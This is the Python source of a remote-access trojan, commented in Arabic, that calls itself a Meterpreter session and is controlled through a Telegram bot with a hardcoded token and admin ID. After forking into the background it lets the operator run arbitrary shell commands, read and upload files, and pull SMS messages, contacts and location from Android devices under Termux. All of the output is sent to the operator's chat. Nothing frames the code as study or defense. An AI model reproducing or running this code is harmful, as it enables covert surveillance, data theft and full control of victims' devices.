import os
import sys
import time
import subprocess
import requests
import platform
import sqlite3
import threading
import random
import string
from datetime import datetime

# ===== معلومات الاتصال (خاصة بك) =====
BOT_TOKEN = '8398512881:AAEXR_zzyZBNFtCNJ0R8zD6mXC3zWZ1Ss0U'
ADMIN_ID = 6644305400
# =====================================

class MeterpreterCore:
    """ميتربريتر متكامل يتحكم فيه عن بعد"""

    def __init__(self):
        self.session_id = self.generate_id()
        self.working_dir = os.getcwd()
        self.running = True

    def generate_id(self):
        return 'MSF_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

    def send_to_telegram(self, text):
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={'chat_id': ADMIN_ID, 'text': text[:4000]}
            )
        except:
            pass

    def send_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    files={'document': f},
                    data={'chat_id': ADMIN_ID}
                )
        except:
            pass

    def execute_command(self, cmd):
        try:
            result = subprocess.check_output(
                cmd, shell=True,
                stderr=subprocess.STDOUT,
                timeout=10,
                universal_newlines=True
            )
            return result
        except subprocess.TimeoutExpired:
            return "⏰ Timeout"
        except Exception as e:
            return f"❌ {e}"

    def get_sms(self):
        try:
            result = subprocess.check_output(
                'content query --uri content://sms/inbox --projection address:body:date --limit 20 2>/dev/null',
                shell=True, timeout=5, universal_newlines=True
            )
            return result or "No SMS"
        except:
            return "SMS not available"

    def get_contacts(self):
        try:
            result = subprocess.check_output(
                'content query --uri content://contacts/phones --projection display_name:number --limit 50 2>/dev/null',
                shell=True, timeout=5, universal_newlines=True
            )
            return result or "No contacts"
        except:
            return "Contacts not available"

    def get_location(self):
        try:
            result = subprocess.check_output(
                'termux-location 2>/dev/null || echo "Location unavailable"',
                shell=True, timeout=5, universal_newlines=True
            )
            return result
        except:
            return "Location unavailable"

    def get_device_info(self):
        info = []
        info.append(f"🆔 Session: {self.session_id}")
        info.append(f"📱 Device: {platform.node()}")
        info.append(f"💻 OS: {platform.system()} {platform.release()}")
        info.append(f"🔧 Arch: {platform.machine()}")
        info.append(f"📂 Path: {self.working_dir}")
        return '\n'.join(info)

    def start(self):
        self.send_to_telegram(f"""
🚀 **Meterpreter Session Opened**
━━━━━━━━━━━━━━━━━━━━━━━
{self.get_device_info()}
━━━━━━━━━━━━━━━━━━━━━━━
📝 **Available commands:**
• `help` - Show commands
• `sysinfo` - System info
• `ls` - List files
• `cd <dir>` - Change directory
• `pwd` - Current path
• `cat <file>` - Read file
• `download <file>` - Download file
• `sms` - Read SMS
• `contacts` - Get contacts
• `location` - Get location
• `shell <cmd>` - Execute command
• `exit` - Close session
""")

        last_update = 0
        while self.running:
            try:
                response = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                    params={'offset': last_update, 'timeout': 30}
                ).json()

                for update in response.get('result', []):
                    last_update = update['update_id'] + 1
                    if update['message']['chat']['id'] == ADMIN_ID:
                        command = update['message']['text'].strip()

                        if command == 'help':
                            self.send_to_telegram("""
📚 Commands:
sysinfo | pwd | ls | cd <dir> | cat <file> | download <file>
sms | contacts | location | shell <cmd> | exit""")

                        elif command == 'sysinfo':
                            self.send_to_telegram(self.get_device_info())
                        elif command == 'pwd':
                            self.send_to_telegram(os.getcwd())
                        elif command == 'ls':
                            try:
                                files = os.listdir('.')
                                self.send_to_telegram('\n'.join(files[:50]))
                            except Exception as e:
                                self.send_to_telegram(f"Error: {e}")
                        elif command.startswith('cd '):
                            try:
                                os.chdir(command[3:])
                                self.working_dir = os.getcwd()
                                self.send_to_telegram(f"Changed to: {self.working_dir}")
                            except Exception as e:
                                self.send_to_telegram(f"Error: {e}")
                        elif command.startswith('cat '):
                            try:
                                with open(command[4:], 'r') as f:
                                    self.send_to_telegram(f.read(3000))
                            except Exception as e:
                                self.send_to_telegram(f"Error: {e}")
                        elif command.startswith('download '):
                            filepath = command[9:].strip()
                            if os.path.exists(filepath):
                                self.send_file(filepath)
                                self.send_to_telegram(f"✅ Downloading {filepath}")
                            else:
                                self.send_to_telegram("❌ File not found")
                        elif command == 'sms':
                            self.send_to_telegram(self.get_sms())
                        elif command == 'contacts':
                            self.send_to_telegram(self.get_contacts())
                        elif command == 'location':
                            self.send_to_telegram(self.get_location())
                        elif command.startswith('shell '):
                            result = self.execute_command(command[6:])
                            self.send_to_telegram(result[:3500])
                        elif command == 'exit':
                            self.send_to_telegram("👋 Session closed")
                            self.running = False
                            sys.exit(0)
                        else:
                            self.send_to_telegram(self.execute_command(command)[:3500])

                time.sleep(2)
            except:
                time.sleep(5)

if __name__ == "__main__":
    if os.name == 'posix':
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except:
            pass
    m = MeterpreterCore()
    m.start()
